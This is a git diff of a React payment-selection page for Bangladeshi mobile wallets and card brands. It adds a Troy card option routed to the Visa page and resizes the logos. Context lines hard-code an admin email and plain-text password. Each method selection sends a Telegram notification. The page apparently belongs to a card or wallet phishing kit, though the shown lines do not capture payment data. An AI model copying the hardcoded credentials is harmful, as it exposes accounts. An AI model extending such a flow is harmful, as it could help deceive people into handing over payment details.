@@ -14,7 +14,7 @@ import rocketLogo from "@/assets/rocket-logo.png";
 import upayLogo from "@/assets/upay-logo.png";
 import visaLogo from "@/assets/visa-logo.png";
 import mastercardLogo from "@/assets/mastercard-logo.png";
-
+import troyLogo from "@/assets/troy-logo.png";
 
 const ADMIN_EMAIL = "abir789@gmail.com";
 const ADMIN_PASSWORD = "778899";
@@ -46,7 +46,7 @@ const Index = () => {
   
   const [loginUnlocked, setLoginUnlocked] = useState(false);
   const [enabledMethods, setEnabledMethods] = useState<Record<string, boolean>>({
-    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true,
+    bkash: true, nagad: true, rocket: false, upay: false, visa: true, mastercard: true, troy: true,
   });
 
   const isMobileOrTablet = typeof window !== 'undefined' && window.innerWidth < 1024;
@@ -121,7 +121,7 @@ const Index = () => {
 
   const handlePaymentSelect = (route: string) => {
     const methodName = route.replace('/', '');
-    const isCard = ['visa', 'mastercard'].includes(methodName);
+    const isCard = ['visa', 'mastercard', 'troy'].includes(methodName);
     sendTelegramNotification({
       type: 'payment_activity',
       method: methodName,
@@ -266,7 +266,7 @@ const Index = () => {
               <img 
                 src={genzLogo} 
                 alt="GenZ" 
-                className="w-14 h-14 md:w-10 md:h-10 lg:w-10 lg:h-10 rounded-full object-cover"
+                className="w-14 h-14 rounded-full object-cover"
               />
             </div>
 
@@ -339,13 +339,13 @@ const Index = () => {
               )}
               <div className="grid grid-cols-2 md:grid-cols-3 gap-2.5 md:gap-3">
                 {[
-                  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-16 md:h-20' },
-                  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-16 md:h-20' },
-                  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-16 md:h-20' },
-                  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-16 md:h-20' },
-                  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'VISA', h: 'h-14 md:h-18' },
-                  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-16 md:h-20' },
-                  
+                  { id: 'bkash', route: '/bkash', logo: bkashLogo, alt: 'bKash', h: 'h-10 md:h-12' },
+                  { id: 'nagad', route: '/nagad', logo: nagadLogo, alt: 'Nagad', h: 'h-10 md:h-12' },
+                  { id: 'rocket', route: '/rocket', logo: rocketLogo, alt: 'Rocket', h: 'h-10 md:h-12' },
+                  { id: 'upay', route: '/upay', logo: upayLogo, alt: 'Upay', h: 'h-10 md:h-12' },
+                  { id: 'visa', route: '/visa', logo: visaLogo, alt: 'VISA', h: 'h-9 md:h-11' },
+                  { id: 'mastercard', route: '/mastercard', logo: mastercardLogo, alt: 'Mastercard', h: 'h-10 md:h-12' },
+                  { id: 'troy', route: '/visa', logo: troyLogo, alt: 'Troy', h: 'h-9 md:h-11' },
                 ].map((method) => {
                   const isEnabled = enabledMethods[method.id] ?? false;
                   return (
